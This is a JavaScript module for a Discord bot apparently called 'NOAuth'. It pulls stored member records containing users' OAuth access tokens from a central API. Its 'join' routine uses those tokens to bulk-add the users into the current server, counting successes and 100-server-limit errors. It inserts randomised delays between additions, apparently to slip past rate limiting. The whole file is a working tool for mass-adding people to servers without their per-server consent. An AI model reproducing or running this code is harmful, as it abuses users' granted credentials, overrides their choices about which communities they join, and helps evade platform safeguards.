import { ModalBuilder,TextInputBuilder, TextInputStyle, ActionRowBuilder } from 'discord.js';
import constants from '../constants.js';


export default {

    //////////////////USERS
    async users(interaction) {

        try {
            // Fetch data from the API
            const response = await fetch(constants.masterUri + 'get_members/?guild_id=' + constants.guildId+"&amount=0");
            const response2 = await fetch(constants.masterUri + 'get_members_count/?guild_id=' + interaction.guildId);
            if (!response.ok) {
                throw new Error(`Failed to fetch data from the API. Status: ${response.status}`);
            }

            const data = await response.json();
            const members = data.members;
            const globalMembersCount = members.length;
            const text = members.splice(0,50).map((member) => `<@${member.userID}>`).join(' ');

            console.log(members);

            const data2 = await response2.json();
            const localGuildCount = data2.count;

            await interaction.update({
                content: text,
                embeds: [{
                    title: '💪 NOAuth Users',
                    description: `🎯 There are \`${localGuildCount}\` users in this server and \`${globalMembersCount}\` users in your NOAuth database splited accross all your servers.`,
                    color: constants.color
                }]
            });
        } catch (error) {
            console.error(error);
            await interaction.update({
                content : "An error occurred while fetching data from the API.",
                embeds: []
            });
        }
    },

        //// SELECT COUNT JOIN
        async selectjoin(interaction) {
            const modal = new ModalBuilder()
                .setCustomId('countuser')
                .setTitle('Final step');
        
            const count = new TextInputBuilder()
                .setCustomId('count')
                .setLabel("Number of people you want to join")
                .setStyle(TextInputStyle.Short)
        
            const countActionRow = new ActionRowBuilder().addComponents(count);
        
            modal.addComponents(countActionRow);
        
            // Reply to the interaction with the modal
            await interaction.showModal(modal);
        },
        

/////////////////JOIN

async join(interaction, amount) {
    
    let msg = await interaction.update({
        content: '**Joining users...**',
        embeds: []
    });
    
    try {
        const response = await fetch(`${constants.masterUri}get_members/?guild_id=${constants.guildId}&amount=${amount}`);
        if (!response.ok) {
            throw new Error(`API request failed with status ${response.status}`);
        }
    
        const json = await response.json();
        let error = 0;
        let success = 0;
        let alreadyJoined = 0;
        let max100 = 0;
        let userNotFound = 0;

        console.log("We fetched " + json.members.length + " users from the API");
    
        for (const userData of json.members) {
            const user = await interaction.client.users.fetch(userData.userID).catch(() => {});
            if (!user) {
                error++;
                userNotFound++;
                console.log("User " + userData.userID + " not found to make him join the server.");
                continue;
            }
                    
            if (interaction.guild.members.cache.get(userData.userID)) {
                alreadyJoined++;
            } else {
                await interaction.guild.members.add(user, { accessToken: userData.access_token })
                .then(() => {
                    success++;
                    console.log("Joined " + user.username + " in the server : " + interaction.guild.name);
                })
                .catch((erro) => {
                    error++;
                    console.log(erro);
                    if (erro.includes("You are at the 100 server limit.")) max100++;
                    console.error("An error occurred while joining " + user.username + " in the server : " + interaction.guild.name);
                });
            }
            const delay = Math.random() * (2000) + 500;
            await new Promise(r => setTimeout(r, delay));
        }
    
        await msg.edit({
            content: `**Joined \`${success}\` users**  `
        });
    
        await msg.edit({
            embeds: [{
                title: '🧑 NOAuth Joinall',
                description: `ℹ️ **Already in server**: ${alreadyJoined}\n✅ **Success**: ${success}\n❌ **Error**: ${error}\n💯 **100-server Limit**: ${max100}\n🔍 **Users not found**: ${userNotFound}`,
                color: constants.color
            }]
        });
        } catch (error) {
            console.error(error);
            await msg.edit({
                content: 'An error occurred while processing the request.'
            });
        }
    },

};